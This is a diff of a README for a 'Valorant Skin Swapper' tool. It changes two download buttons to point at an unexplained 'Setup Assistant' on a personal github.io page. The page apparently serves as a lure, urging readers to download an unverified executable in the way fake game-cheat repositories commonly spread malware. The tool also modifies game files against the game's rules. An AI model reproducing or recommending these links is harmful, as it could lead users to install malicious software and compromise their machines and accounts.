@@ -1,7 +1,7 @@
 # 🎯 Valorant Skin Swapper — Cosmetic Customization Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://download-portal-demo.github.io/.github/SkinSwapperValoRant11)
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=valorant)](https://download-portal-demo.github.io/.github/SkinSwapperValoRant11)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://trahendon.github.io/.github/SkinSwapperValoRant11=pc1)
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=valorant)](https://trahendon.github.io/.github/SkinSwapperValoRant11=pc1)
 
 ---
 
